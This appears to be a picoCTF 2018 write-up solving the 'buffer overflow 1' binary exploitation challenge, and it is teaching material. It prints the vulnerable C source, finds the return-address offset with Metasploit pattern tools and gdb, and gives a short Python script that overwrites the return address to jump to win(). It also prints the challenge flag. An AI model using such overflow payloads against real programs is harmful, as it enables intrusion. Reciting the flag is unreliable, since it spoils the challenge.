# buffer overflow 1
**Points: 200**

## Binary Exploitation

## Question
>Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba on the shell server. Source.

### Hint
>This time you're actually going to have to control that return address!
>
>Make sure you consider Big Endian vs Little Endian.
## Solution
Check the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
We have to redirect the _eip_ to win(). To do that we have to set the direction of win() as the return address.
First we have to find the padding, we can do it using msf-pattern:
```
# msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
# msf-pattern_offset -q 0x35624134
[*] Exact match at offset 44
```
So our exploit : "A"*44 + _win dir_
```gdb-peda$ p win
$2 = {<text variable, no debug info>} 0x80485cb <win>
```

```python
import struct

padding = "A" * 44
ret = struct.pack("<I",0x80485cb)
print padding + ret
```

![alt text](https://github.com/manulqwerty/picoCTF-2018-WriteUp/blob/master/Binary%20Exploitation/buffer%20overflow%201/images/1.png)

### Flag
`picoCTF{addr3ss3s_ar3_3asy56a7b196}`
